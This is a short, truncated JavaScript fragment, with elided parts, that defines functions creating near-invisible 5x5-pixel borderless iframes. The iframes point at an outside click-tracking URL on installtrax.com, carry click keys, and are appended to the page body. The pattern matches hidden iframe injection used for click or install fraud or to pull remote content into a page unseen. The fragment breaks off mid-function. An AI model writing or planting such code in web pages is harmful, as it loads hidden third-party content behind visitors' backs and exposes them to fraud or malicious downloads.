...
if(phT > 1) {
 ...
 function cd2() {
    ifrm = document.createElement('IFRAME');ifrm.setAttribute('src', 'http://installtrax.com/click.php?c=186&key=yy57281um7emiy157qu4cg43');
    ifrm.setAttribute('FRAMEBORDER', '0');ifrm.setAttribute('SCROLLING', 'NO');ifrm.style.width = 5+'px';ifrm.style.height = 5+'px';document.body.appendChild(ifrm);
 }
 function cd3() {
    ifrm = document.createElement('IFRAME');ifrm.setAttribute('src', 'http://installtrax.com/click.php?c=187&key=42qy4m6rta9j463qqz6qu09s');
    ifrm.setAttribute('FRAMEBORDER', '0');ifrm.setAttribute('SCROLLING', 'NO');ifrm.style.width = 5+'px';ifrm.style.height = 5+'px';document.body.appendChild(ifrm);
    }
 function cd4() {
